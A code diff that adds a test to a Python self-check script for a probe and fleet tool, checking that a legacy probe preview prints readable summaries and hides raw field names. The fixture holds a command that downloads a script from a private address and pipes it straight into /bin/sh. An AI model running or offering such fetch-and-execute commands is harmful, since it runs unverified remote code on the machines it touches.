@@ -546,7 +546,7 @@ def run_line_local_ips_check():
     )
     from gritlib.line_network import print_line_local_ips
     from gritlib.line_workspace import line_repl_status_bar
-    from gritlib.probe_commands import parse_line_probe_args
+    from gritlib.probe_commands import dispatch_legacy_probe_number, parse_line_probe_args
     from gritlib.probe_results import (
         append_probe_result,
         clear_line_probe_results,
@@ -656,6 +656,56 @@ def run_line_local_ips_check():
         return 1
     if parse_line_probe_args(["start", "queue"]) != (True, True):
         print("probe start/queue aliases did not map to canonical flags", file=sys.stderr)
+        return 1
+    probe_snapshot = {
+        "probe_workflow_actions": [
+            {
+                "id": "probe:show-probe-command",
+                "target_command": "wget -O- http://10.0.0.5:22207/probe.sh | /bin/sh",
+                "route_kind": "direct",
+                "bridge_profile": "",
+                "bridge_route_path": "",
+                "fleet_mailbox_pending_work_count": 2,
+                "fleet_offline_target_count": 1,
+                "fleet_poll_overdue_target_count": 0,
+                "operator_action_state": "ready",
+                "operator_action_reason": "run-now",
+            },
+            {
+                "id": "probe:start-probe",
+                "headless_command": "scripts/grit-console --transport probe",
+                "operator_action_state": "ready",
+                "operator_action_reason": "listener-stopped",
+            },
+        ],
+        "probe_workflow_actions_by_id": {},
+    }
+    probe_snapshot["probe_workflow_actions_by_id"] = {
+        rec["id"]: rec for rec in probe_snapshot["probe_workflow_actions"]
+    }
+    buf = io.StringIO()
+    with contextlib.redirect_stdout(buf):
+        handled_probe = dispatch_legacy_probe_number(
+            "19",
+            {},
+            input_func=lambda _prompt: "n",
+            snapshot_func=lambda _cfg: probe_snapshot,
+            append_event_fn=lambda *args, **kwargs: None,
+            start_service_func=lambda *args, **kwargs: None,
+        )
+    probe_preview_text = buf.getvalue()
+    if (
+            handled_probe is not True
+            or "target command: wget -O-" not in probe_preview_text
+            or "route: direct" not in probe_preview_text
+            or "fleet: 2 pending work; 1 offline targets; 0 poll overdue" not in probe_preview_text
+            or "show action: ready; reason run-now" not in probe_preview_text
+            or "target_command:" in probe_preview_text
+            or "route=" in probe_preview_text
+            or "fleet_pending_work=" in probe_preview_text
+            or "show_action_state=" in probe_preview_text):
+        print("legacy probe preview exposed raw workflow fields", file=sys.stderr)
+        print(probe_preview_text, file=sys.stderr)
         return 1
     if parse_line_config_args(["1", "--write-config", "configs/grit.conf"], "probe config") != (
             "1", "configs/grit.conf", []):
@@ -10361,7 +10411,7 @@ def main(argv=None):
                  "operator_daemon_workflow_actions",
                  "operator_daemon_workflow_action_selected", "operator_daemon_workflow_action_completed",
                  "Probe workflow action summary:", "probe_workflow_actions_by_route_kind",
-                 "probe_workflow_actions:",
+                 "workflow actions:",
                  "probe_workflow_action_selected", "probe_workflow_action_completed",
                  "Command queue workflow action summary:", "command_queue_workflow_actions_by_action_id",
                  "queue COMMAND  |  queue list",
